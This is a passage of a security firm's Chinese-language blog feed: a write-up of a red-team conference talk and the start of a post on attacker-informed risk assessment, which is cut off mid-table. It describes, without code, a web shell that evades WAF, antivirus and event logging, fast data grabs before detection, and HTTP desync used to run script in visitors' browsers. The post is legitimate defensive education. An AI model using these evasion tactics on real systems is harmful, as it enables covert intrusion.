&lt;p&gt;這一篇是我在 &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE CONFERENCE 2019&lt;/a&gt; 所分享的主題。研討會事前調查想聽內容時有些朋友希望我們能介紹 DEVCORE 的紅隊，還有運作方式和案例，所以我抽出一些素材整理成這場演講。下面是投影片連結，其中有些內部系統畫面不對外公開，僅在研討會分享敬請見諒。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/conf/2019/slides/devcore-conf-2019-shaolin-DEVCORE%20%E7%B4%85%E9%9A%8A%E7%9A%84%E9%80%B2%E5%8C%96%EF%BC%8C%E8%88%87%E4%B8%8B%E4%B8%80%E6%AD%A5.pdf&quot;&gt;DEVCORE 紅隊的進化，與下一步 － Shaolin (DEVCORE CONF 2019)&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;為什麼要紅隊演練&quot;&gt;為什麼要紅隊演練？&lt;/h2&gt;

&lt;p&gt;一言以蔽之，就是我們漸漸體會到：&lt;strong&gt;對大企業而言，單純的滲透測試並不是最有效益的&lt;/strong&gt;。從過去上百次滲透測試經驗中，我們往往能在專案初期的偵查階段，發現企業邊界存在嚴重弱點，進而進入內網繞過層層防禦攻擊主要目標。越是龐大的企業，這種狀況會越明顯，因為他們通常有很多對外的網站、網路設備，每一個都可能是風險，即使主要網站防護很完備，駭客只需要從這麼多目標中找到一個問題，就可以對企業造成傷害。今天就算企業對每個服務都獨立做了一次滲透測試，在真實世界中，還是有可能從第三方服務、廠商供應鏈、社交工程等途徑入侵。所以有可能投注很多資源做測試，結果還是發生資安事件。&lt;/p&gt;

&lt;p&gt;於是，我們推出了紅隊演練，希望透過真實的演練幫助企業找到整體架構中脆弱的地方。因此，這個服務關注的是&lt;strong&gt;企業整體的安全性&lt;/strong&gt;，而不再只是單一的網站。&lt;/p&gt;

&lt;p&gt;紅隊演練目標通常是一個情境，例如：駭客有沒有辦法取得民眾個資甚至是信用卡卡號？在演練過程中紅隊會無所不用其極的嘗試驗證企業在乎的情境有沒有可能發生。以剛剛的例子來說，我們會想辦法找到一條路徑取得存放這些訊息的資料庫，去驗證有沒有辦法取得個資及卡號。一般來說，卡號部分都會經過加密，因此在拿下資料庫後我們也會嘗試看看有沒有辦法還原這些卡號。有時候除了找到還原的方法，我們甚至會在過程中發現其他路徑可取得卡號，可能是工程師的 debug 資訊會記錄卡號，或是備份檔在 NAS 裡面有完整卡號，這些可能是連資安負責人都不知道的資訊，也是企業評估風險的盲點。&lt;/p&gt;

&lt;p&gt;到這邊，紅隊演練的效益就很明顯了，紅隊能協助企業全盤評估潛在的重大風險，不再像過去只是單一面向的測試特定網站。除了找到弱點，紅隊更在乎幫企業&lt;strong&gt;驗證入侵的可行性&lt;/strong&gt;，方便企業評估風險以及擬定防禦策略。最後，紅隊往往也能夠在演練過程當中&lt;strong&gt;找出企業風險評估忽略的地方&lt;/strong&gt;，例如剛剛例子提到的備份 NAS，就可能是沒有列入核心系統但又相當重要的伺服器，這一塊也是 DEVCORE 這幾年來確實幫助到客戶的地方。&lt;/p&gt;

&lt;h2 id=&quot;devcore-紅隊的編制&quot;&gt;DEVCORE 紅隊的編制&lt;/h2&gt;

&lt;p&gt;基本上，DEVCORE 的紅隊成員都是可以獨當一面的，在執行一般專案時成員間並沒有顯著差異。但在演練範圍比較大的狀況下，就會開始有明顯的分工作業，各組也會專精技能增加團隊效率。目前我們的編制共分為五組：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;簡單介紹職責如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Intelligence (偵查)，負責情報偵查，他們會去收集跟目標有關的所有資訊，包括 IP 網段、網站個別使用的技術，甚至是洩漏的帳號密碼。&lt;/li&gt;
  &lt;li&gt;Special Force (特攻)，有比較強大的攻擊能力，主要負責打破現況，例如攻下第一個據點、拿下另一個網段、或是主機的提權。&lt;/li&gt;
  &lt;li&gt;Regular Army (常規)，負責拿下據點後掃蕩整個戰場，嘗試橫向移動，會盡量多建立幾個據點讓特攻組有更多資源朝任務目標邁進。&lt;/li&gt;
  &lt;li&gt;Support (支援)，重要的後勤工作，維持據點的可用性，同時也要觀察記錄整個戰況，最清楚全局戰況。&lt;/li&gt;
  &lt;li&gt;Research (研究)，平時研究各種在紅隊中會用到的技術，演練時期碰到具戰略價值的系統，會投入資源開採 0-day。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;devcore-紅隊的進化&quot;&gt;DEVCORE 紅隊的進化&lt;/h2&gt;

&lt;p&gt;所謂的進化，就是碰到了問題，想辦法強化並且解決，那我們遇到了哪些問題呢？&lt;/p&gt;

&lt;h3 id=&quot;如何找到一個突破點&quot;&gt;如何找到一個突破點？&lt;/h3&gt;

&lt;p&gt;這是大家最常碰到的問題，萬事起頭難，怎麼樣找到第一個突破點？這個問題在紅隊演練當中難度會更高，因為有規模的企業早已投入資源在資安檢測和防護上，我們要怎麼樣從層層防禦當中找到弱點？要能找到別人找不到的弱點，測試思維和方法一定要跟別人不一樣。於是，我們投入資源在偵查、特攻、研究組：偵查部分研究了不同的偵查方法和來源，並且開發自己的工具讓偵查更有效率；我們的特攻組也不斷強化自己的攻擊能力；最重要的，我們讓研究人員開始針對我們常碰到的目標進行研究，開發紅隊會用到的工具或技巧。&lt;/p&gt;

&lt;p&gt;這邊特別想要分享研究組的成果，因為我們會去開採一些基礎設施的 0-day，在負責任的揭露後，會將 1-day 用於演練中，這種模式對國外紅隊來說算是相當少見。為了能幫助到紅隊，研究組平時的研究方向，通常都是找企業外網可以碰到的通用服務，例如郵件伺服器、Jenkins、SSL VPN。我們找的弱點都是以不用認證、可取得伺服器控制權為優先，目前已公開的有：&lt;a href=&quot;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&quot;&gt;Exim&lt;/a&gt;、&lt;a href=&quot;https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;Jenkins&lt;/a&gt;、&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Palo Alto GlobalProtect&lt;/a&gt;、&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;FortiGate&lt;/a&gt;、&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;Pulse Secure&lt;/a&gt;。這些成果在演練當中都有非常非常高的戰略價值，甚至可以說掌控了這些伺服器幾乎就能間接控制企業的大半。&lt;/p&gt;

&lt;p&gt;而這些研究成果，也意外的被國外所注意到：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;PortSwigger 連續兩年年度十大網站攻擊技術評選冠軍 (&lt;a href=&quot;https://portswigger.net/blog/top-10-web-hacking-techniques-of-2017&quot;&gt;2017&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/blog/top-10-web-hacking-techniques-of-2018&quot;&gt;2018&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;連續三年 DEFCON &amp;amp; Black Hat USA 發表 (&lt;a href=&quot;https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages&quot;&gt;2017&lt;/a&gt;, &lt;a href=&quot;https://www.blackhat.com/us-18/briefings/schedule/index.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-days-out-10346&quot;&gt;2018&lt;/a&gt;, &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/index.html#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;2019&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;台灣第一個拿到 PWNIE AWARD 獎項：Pwnie for Best Server-Side Bug (年度最佳伺服器漏洞) (&lt;a href=&quot;https://pwnies.com/archive/2018/nominations/&quot;&gt;2018 入圍&lt;/a&gt;, &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;2019 得獎&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;目標上萬台如何發揮紅隊效益&quot;&gt;目標上萬台，如何發揮紅「隊」效益？&lt;/h3&gt;

&lt;p&gt;前面靠了偵查、特攻、研究組的成果取得了進入點。下一個問題，是在我們過去的經驗中，有過多次演練的範圍是上萬台電腦，我們要怎樣做才能發揮團隊作戰的效益呢？會有這個問題是因為&lt;strong&gt;數量級&lt;/strong&gt;，如果範圍只有十個網站很容易找目標，但是當網站變多的時候，就很難標註討論我們要攻擊的目標。或是當大家要同步進度的時候，每個人的進度都很多，很難有個地方分享伺服器資訊，讓其他人能接續任務。&lt;/p&gt;

&lt;p&gt;過去我們使用類似 Trello 的系統記錄每台伺服器的狀況，在範圍較小的時候很方便好用，但是當資料量一大就會顯得很難操作。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因此，我們自行開發了系統去解決相關問題。分享一些我們設計系統的必要原則供大家參考：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;伺服器列表可標籤、排序、全文搜尋，火力集中的伺服器必須要自動在顯眼處，省去額外搜尋時間。&lt;/li&gt;
  &lt;li&gt;要可自動建立主機關係圖，方便團隊討論戰況。&lt;/li&gt;
  &lt;li&gt;儲存結構化資訊而非過去的純字串，例如這台機器開的服務資訊、拿 shell 的方式、已滲透的帳號密碼。方便快速釐清目前進度以及事後分析。&lt;/li&gt;
  &lt;li&gt;建立 shell 主控台，方便成員一鍵取得 shell 操作。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;另外還有一個問題，紅隊成員這麼多，戰場又分散，如果想要把我們做過的測試過程記錄下來，不是會很複雜嗎？所以我們另外寫了 plugin 記錄 web 的攻擊流量、以及記錄我們在 shell 下過的指令和伺服器回傳的結果，這些記錄甚至比客戶的 access_log 和 bash_history 還詳細。此外，針對每個目標伺服器，我們也會特別記錄在上面所做過的重要行為，例如：改了什麼設定，新增或刪除了什麼檔案，方便我們還有客戶追蹤。要做這樣的客製化記錄其實是很繁瑣的，對那些習慣於自動化解決事情的駭客更是，但我們就是堅持做好這樣的紀錄，即使客戶沒有要求，我們還是會詳實記錄每個步驟，以備不時之需。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;企業有防禦設備或機制&quot;&gt;企業有防禦設備或機制？&lt;/h3&gt;

&lt;p&gt;解決了突破點和多人合作的問題，接下來我們面臨到第三個問題，企業有防護措施！在研討會中我舉了幾個較客製的真實防禦案例，說明我們除了常見的防禦設備外也擁有很多跟防禦機制交手的經驗。我們會研究每種防禦的特性加以繞過或利用，甚至會寫工具去躲避偵測，最近比較經典的是團隊做了在 Windows 伺服器上的 Web shell，它可以做到 WAF 抓不到，防毒軟體抓不到，也不會有 eventlog 記錄，利用這個工具可以無聲無息收集伺服器上我們需要的資料。當然，我們不是無敵的，一些較底層的偵測機制還是會無法繞過。這邊我直接講我們進化到目前的準則：在面對伺服器防禦機制，我們能隱匿的，一定做到絕對的隱匿，無法躲的，就把流程最佳化，縮短做事情的時間，例如控制在五分鐘內提權拿到關鍵資料，就算被別人抓到也沒關係，因為該拿的資料也拿到了。&lt;/p&gt;

&lt;h2 id=&quot;紅隊成員應具備的特質&quot;&gt;紅隊成員應具備的特質&lt;/h2&gt;

&lt;p&gt;要能夠在紅隊演練中有突出成果，我覺得成員特質是滿關鍵的一個點。以下整理了幾個我從我們紅隊夥伴觀察到的特質跟大家分享，如果將來有打算從事紅隊工作，或是企業已經打算開始成立內部紅隊，這些特質可能可以作為一些參考。&lt;/p&gt;

&lt;h3 id=&quot;想像力&quot;&gt;想像力&lt;/h3&gt;

&lt;p&gt;第一個是想像力，為什麼會提這個特質，因為現在資安意識慢慢強化，要靠一招打天下是不太有機會的，尤其是紅隊演練這麼有變化的工作。要有成果一定要巧妙的組合利用或是繞過才有機會。&lt;/p&gt;

&lt;p&gt;直接舉個例子，我們在公布 Pulse Secure VPN 的&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;研究細節&lt;/a&gt;後，有人在 twitter 上&lt;a href=&quot;https://twitter.com/_trou_/status/1168529031177867267&quot;&gt;表示&lt;/a&gt;那個關鍵用來 RCE 的 argument injection 點之前他有找到，只是無法利用所以官方也沒有修。確實我們找到的地方相同，不過我們靠想像力找到了一個可利用參數並搭配 Perl 的特性串出了 RCE。
另一個例子是 &lt;a href=&quot;https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;Jenkins 研究&lt;/a&gt;裡面的一環，我們在繞過身分認證之後發現有一個功能是在檢查使用者輸入的程式語法正不正確。伺服器怎樣去判斷語法正不正確？最簡單的方法就是直接去編譯看看，可以編譯成功就代表語法正確。所以我們研究了可以在『編譯階段』命令執行的方法，讓伺服器在嘗試判斷語法是否正確的同時執行我們的指令。這個手法過去沒有人提過，算是運用想像力的一個經典案例。&lt;/p&gt;

&lt;p&gt;關於想像力，其實還有一個隱藏的前提：基礎功要夠。我一直認為想像力是知識的排列組合，例如剛剛的兩個例子，如果不知道 Perl 語法特性和 Meta-Programming 的知識，再怎麼天馬行空都是不可能成功 RCE 的。有基礎功再加上勇於聯想和嘗試，絕對是一個紅隊大將的必備特質。至於基礎功需要到什麼程度，對我們來說，講到一個漏洞，心中就會同時跳出一個樹狀圖：出現成因是什麼？相關的案例、漏洞、繞過方式都會啵啵啵跳出來，能做到這樣我想就已經是有所小成了。&lt;/p&gt;

&lt;h3 id=&quot;追新技術&quot;&gt;追新技術&lt;/h3&gt;

&lt;p&gt;會追新技術這件事情，似乎是資安圈的標配，我們的世界不只有 OWASP TOP 10。更現實的說法是，如果只靠這麼一點知識，在紅隊演練能發揮的效果其實並不大。分享一下我看到成員們的樣子，對於他們來說，看新技術是每天的習慣，如果有資安研討會投影片釋出，會追。新技術裡有興趣的，會動手玩，甚至寫成工具，我們很多內部工具都是這樣默默補強的。還有一點，看新技術最終目的就是要活用，拿新技術解決舊問題，往往有機會發現一些突破方式。例如我們在今年八月 BlackHat 研討會看到了 &lt;a href=&quot;https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn&quot;&gt;HTTP Desync&lt;/a&gt; 的攻擊方式，回國之後馬上就把這個知識用在當時的專案上，讓我們多了一些攻擊面向！（這個手法挺有趣的，在我們污染伺服器後，隨機一個人瀏覽客戶網頁就會執行我們的 JavaScript，不需要什麼特殊條件，有興趣可以研究一下:p ）&lt;/p&gt;

&lt;h3 id=&quot;相信以及堅持&quot;&gt;相信…以及堅持&lt;/h3&gt;

&lt;p&gt;最後一點，我想分享的是：在研究或者測試的過程當中，有時候會花費很多時間卻沒有成果，但是如果你評估是有機會，那就相信自己，花時間做下去吧！
我們有一個花費一個月的例子，是之前&lt;a href=&quot;https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;破解 IDA Pro 偽隨機數&lt;/a&gt;的研究，這個事件意外在 binary 圈很有名，甚至還有人寫成&lt;a href=&quot;https://medium.com/the-singularity-is-near/recent-leak-of-ida-pro-7-2-a-brief-timeline-4c1dcbe6331e&quot;&gt;事件懶人包&lt;/a&gt;。這個研究是在探討如果我們沒有安裝密碼，有機會安裝 IDA PRO 嗎？結果最後我們想辦法逆推出了 IDA 密碼產生器的算法，知道偽隨機數使用了哪些字元，和它的正確排序。這件事情的難度已經不只在技術上，而在於要猜出偽隨機數使用的字元集順序，還要同時猜出對方使用的演算法（至少有88種）。而且我們每驗證一種排列組合，就會花半天時間和 100GB 的空間，累積成本滿高的。但我們根據經驗相信這是有機會成功的，並且投注資源堅持下去，最後有了很不錯的成果。&lt;/p&gt;

&lt;p&gt;這裡不是在鼓勵一意孤行，而是一種心理素質：是在面臨卡關的時候，有足夠的判斷力，方向錯誤能果斷放棄，如果方向正確要有堅持下去的勇氣。&lt;/p&gt;

&lt;h2 id=&quot;資安防護趨勢與紅隊的下一步&quot;&gt;資安防護趨勢與紅隊的下一步&lt;/h2&gt;

&lt;p&gt;文章的最後一部分要談的是紅隊演練的未來，也是這篇文章的重點，未來，我們希望可以解決什麼問題？&lt;/p&gt;

&lt;p&gt;做為紅隊演練的領導廠商，從 2017 年演練到現在我們進入台灣企業內網的成功率是 100%。我們在超過六成的演練案中拿到 AD 管理權限，這還不含那些不是用 AD 來管理的企業。我們發現進入內網後，通常不會有什麼阻礙，就好像變成內部員工，打了聲招呼就可以進機房。想要提醒大家的是：對頂尖攻擊團隊而言，進入企業內網的難度並不高。如果碰上頂尖的駭客，或是一個 0day，企業準備好了嗎？這就是現階段我們所發現的問題！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在說到抵禦攻擊通常會有三個面向，分別是「預防」、「偵測」和「回應」。一般而言企業在「預防」這部份做的比較完善，對於已知的弱點都有比較高的掌握度。今天普遍的問題在「&lt;strong&gt;偵測&lt;/strong&gt;」和「&lt;strong&gt;回應&lt;/strong&gt;」上，企業能不能發現有人在對你進行攻擊？或是知道被攻擊後有沒有能力即時回應並且根絕源頭？這兩件事情做得相對不好的原因並不是企業沒有投入資源在上面，而是對於企業來說太難驗證，很難有個標準去確定目前的機制有沒有效或是買了設備有沒有作用，就算有藍隊通常也沒有建立完善的應對 SOP，畢竟駭客入侵不會是天天發生的事情。&lt;/p&gt;

&lt;p&gt;所以，我們希望企業能從紅隊演練中，訓練對攻擊事件的偵測和反應能力。或是說，紅隊演練的本質就是在真實的演練，透過攻防幫助企業了解自己的弱項。過去台灣的紅隊服務都會強調在找出整個企業的弱點，找出漏洞固然重要，但碰到像我們一樣很常找到 0-day 的組織，有偵測和回應能力才是最後能救你一命的硬技能。換個角度來看，目前世界上最完整的攻擊戰略和技術手法列表是 &lt;a href=&quot;https://attack.mitre.org/&quot;&gt;MITRE ATT&amp;amp;CK Framework&lt;/a&gt;，一個對企業有傷害的攻擊行動通常會是很多個攻擊手法所組成的攻擊鏈，而在這個 Framework 中，找到起始弱點這件事情僅佔了整個攻擊鏈不到一成，企業如果能夠投注在其他九成手法的偵測能力上並阻斷其中任一環節，就有機會讓整個攻擊行動失敗而保護到資產。&lt;/p&gt;

&lt;p&gt;要說的是，我們紅隊演練除了找出企業漏洞能力頂尖之外，也累積了很豐富的內網滲透經驗及技巧，我們很樂意透過演練協助企業加強真實的偵測和回應能力。漸漸的，未來紅隊會慢慢著重在和藍隊的攻防演練。會強調擬定戰略，讓企業了解自己對哪些攻擊的防禦能力比較弱，進而去改善。未來的紅隊也更需要強調與防禦機制交手的經驗，了解防禦的極限，才有辦法找到設備設定不全或是涵蓋率不足的盲點。&lt;/p&gt;

&lt;p&gt;最後我們也有些規劃建議給對資安防禦比較成熟的企業如下，逐步落實可以將資安體質提昇一個層次。（至少從我們的經驗來看，有這些概念的企業都是特別難攻擊達成目標的）&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如果外網安全已投資多年，開始思考「&lt;strong&gt;如果駭客已經在內網&lt;/strong&gt;」的防禦策略&lt;/li&gt;
  &lt;li&gt;盤點出最不可以被洩漏的重要資料，從這些地方開始奉行 &lt;strong&gt;Zero Trust&lt;/strong&gt; 概念&lt;/li&gt;
  &lt;li&gt;企業內部需要有專職資安人員編制（藍隊）&lt;/li&gt;
  &lt;li&gt;透過與有經驗的紅隊合作，全盤檢視防禦盲點&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;後記&quot;&gt;後記&lt;/h2&gt;

&lt;p&gt;研討會內容到這邊就結束了。寫在最後的最後，是充滿著感謝。其實無論滲透測試還是紅隊演練，在一開始都不是人人可以接受的，而測試的價值也不是我們說了算。一路走來，漸漸漸漸感受到開始有人相信我們，從早期比較多測試時與工程師和網管人員的對立，到近期越來越多 open mind、就是想找出問題的客戶，是滿大的對比。非常感謝他們的信任，也因為這樣的互信，我們得以節省時間完成更棒的產出。滿樂見台灣資訊產業是這樣正向面對問題，漏洞存在就是存在，不會因為視而不見而真的不見，意識到有問題解決了就好。所以我在演講最後留下這樣一句：『&lt;strong&gt;紅隊演練的精髓不是在告訴你有多脆弱，在於真正壞人闖入時你可以獨當一面擋下&lt;/strong&gt;』，希望越來越多人能正面對待問題，同時也傳遞我們想要做到的價值。&lt;/p&gt;

&lt;p&gt;2019 DEVCORE CONF，謝謝過去合作的朋友們參與讓 DEVCORE 紅隊得以進化，希望下一步也能有你，我們明年見 :)&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/10/24/evolution-of-DEVCORE-red-team-and-the-next/</link>
                <guid>https://devco.re/blog/2019/10/24/evolution-of-DEVCORE-red-team-and-the-next</guid>
                <pubDate>Thu, 24 Oct 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>以攻擊者的角度制定防禦策略</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;這篇文章源自於公司今年第一次試辦的研討會 &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE CONFERENCE 2019&lt;/a&gt;，我們決定另外寫成 blog 分享出來，讓無法參加的朋友也可以從不同角度重新思考防禦策略。&lt;/p&gt;

&lt;p&gt;會想在純技術導向的研討會中加入策略面的議題，其實跟今年研討會的主軸「&lt;strong&gt;從策略擬定控制，從控制反映意識&lt;/strong&gt;」有關。如果企業缺乏長遠正確的資安策略，除了投入的資源無法達到企業預期的效益、一線資安人員疲於奔命外，管理階層在資訊不對稱的情況下認為投入的資源已經足夠安全，最終形成惡性循環，只能在每次資安事故後跟著時下流行選擇最夯資安的產品。&lt;/p&gt;

&lt;h2 id=&quot;理想中的防禦策略&quot;&gt;理想中的防禦策略&lt;/h2&gt;
&lt;p&gt;而最廣為人知的防禦策略可能是縱深防禦，以不同類型的控制措施 (設備、制度、服務) 減少敵人入侵的可能性、儘量減少單一控制措施失效造成的風險。然而，這個概念有幾個需要思考的重點&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;防護邊界遠大於企業的想像：導致無法掌握企業可能的入侵點。&lt;/li&gt;
  &lt;li&gt;對資安設備認知錯誤：這讓敵人可以繞過資安設備，或是設備沒有發揮企業預期的效用。&lt;/li&gt;
  &lt;li&gt;管理程序不夠落實：導致控制措施產生新的漏洞，譬如預設密碼沒有更改，導致 VPN 或網路設備可以直接被存取。&lt;/li&gt;
  &lt;li&gt;忽視重要資產相關性：只將防禦資源投注在重要資產本身，而輕忽與其相連的資產。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;這一連串的疏忽，可能成為攻擊者入侵的路徑，就是所謂的瑞士起司模型 （Swiss Cheese Model)，因此企業期望透過風險評鑑 (Risk Assessment) 來盤點出可能的疏失，並且在權衡資源下，確保將重心放在高風險需要優先處理的項目。&lt;/p&gt;

&lt;p&gt;但我們想聊聊這個工具在實務上有它難以完善之處，以及從攻擊者的角度是怎樣看待這個擬訂防禦策略核心工具，我們會針對一下議題依序說明&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;真實風險其實複雜的難以評估&lt;/li&gt;
  &lt;li&gt;現行風險評鑑方式可能的偏差&lt;/li&gt;
  &lt;li&gt;從攻擊者的角度改善風險評鑑&lt;/li&gt;
  &lt;li&gt;挑選適合的方法改善風險評鑑&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;真實的風險其實複雜的難以評鑑&quot;&gt;真實的風險其實複雜的難以評鑑&lt;/h2&gt;
&lt;p&gt;在這裡我們引述 ITGovernance 對於風險評鑑的定義：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Risk Assessment – the process of identifying, analyzing and evaluating risk – is the only way to ensure that the cyber security controls you choose are appropriate to the risks your organization faces.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;風險評鑑的精髓在於後半段的&lt;strong&gt;確保所選擇的控制措施是否適切於企業真正面臨的風險&lt;/strong&gt;，但多數的企業只完成前半段&lt;strong&gt;識別、分析及評估風險&lt;/strong&gt;，導致風險評鑑的成效無法完全發揮；而要達到風險評鑑的精髓，得先了解&lt;strong&gt;真實的風險&lt;/strong&gt;的組成的要素&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;真實風險 = { 威脅來源、意圖、威脅、弱點、機率、相依性、資產價值、控制措施 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;威脅來源(Threat Agent)：造成威脅或使用弱點的來源個體，例如：組織型犯罪、駭客組織、國家資助犯罪、競爭對手、駭客、內部員工或天災等。&lt;/li&gt;
  &lt;li&gt;意圖(Intent)：威脅來源的想達到的目的，例如：取得個人資料、盜取商業機密、破壞企業/個人形象、造成財物損失等。&lt;/li&gt;
  &lt;li&gt;威脅(Threat)：達成意圖的方式，例如：惡意程式、社交工程、DDoS、利用系統漏洞等。&lt;/li&gt;
  &lt;li&gt;弱點(Vulnerability)：指資產能被威脅利用的弱點，例如：漏洞未更新、人員疏忽、組態設定不當、網路區隔配置錯誤等。&lt;/li&gt;
  &lt;li&gt;機率(Probability)：指弱點的易用度或可能發生的機率，例如：CVSS 3.0分數、過去對於某個弱點發生頻率的統計等。&lt;/li&gt;
  &lt;li&gt;相依性(Correlation)：資產彼此間的關聯，例如：網路拓樸、虛擬化的關係、集中派版系統、防毒中控主機等。&lt;/li&gt;
  &lt;li&gt;資產價值(Value)：企業認定該資產在 C、I、A 及法律衝擊下，所具有的價值，例如：核心系統及資料、一般操作資料、實體設備等。&lt;/li&gt;
  &lt;li&gt;控制措施(Countermeasure)：用來降低企業面臨風險的措施，例如：資安設備、管理制度、教育訓練等。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;然而，多數企業在評估企業風險時，為求方便，會將風險評鑑的參數簡化成 {&lt;strong&gt;弱點、機率、資產價值&lt;/strong&gt;}，忽略了與敵人相關的參數 {威脅來源、意圖、威脅、戰略價值}；接下來的兩個例子將說明忽略後造成風險評鑑的偏差，包含了&lt;strong&gt;資產價值的輕忽&lt;/strong&gt;及&lt;strong&gt;輕忽漏洞利用的可能性&lt;/strong&gt;。&lt;/p&gt;

&lt;h2 id=&quot;現實風險評鑑可能的偏差&quot;&gt;現實風險評鑑可能的偏差&lt;/h2&gt;
&lt;h3 id=&quot;敵人在意的是戰略價值而不僅是資產價值&quot;&gt;敵人在意的是戰略價值而不僅是資產價值&lt;/h3&gt;

&lt;p&gt;透過風險評鑑可以識別出資產可能面臨的風險，並且作為預算或資源投入優先順序的參考，一般可以分為 3 個優先等級：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;優先處理「高衝擊、高機率」 (項次 1、項次 2) 的風險：通常是超出企業可接受風險的威脅，藉由控制措施將風險下降到可接受的程度，這部分通常是企業資源優先或持續投入的重點。&lt;/li&gt;
  &lt;li&gt;次之是「高衝擊、低機率 」(項次 3、項次 4)的風險：此等級是屬於需要持續關注避免升高的風險，如果企業預算仍有餘裕，應該投入的第二個等級。&lt;/li&gt;
  &lt;li&gt;最後是「低衝擊、低機率 」(項次 5、項次 6)的風險：看起來對企業不會有立即危害，一般不需特別關注或投入資源。&lt;/li&gt;
&lt;/ol&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;項次&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;資產名稱&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;價值&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;威脅&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;弱點&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;衝擊&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;機率&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;風險&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;交易資料&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;蓄意破壞&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;建築物管制不足&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
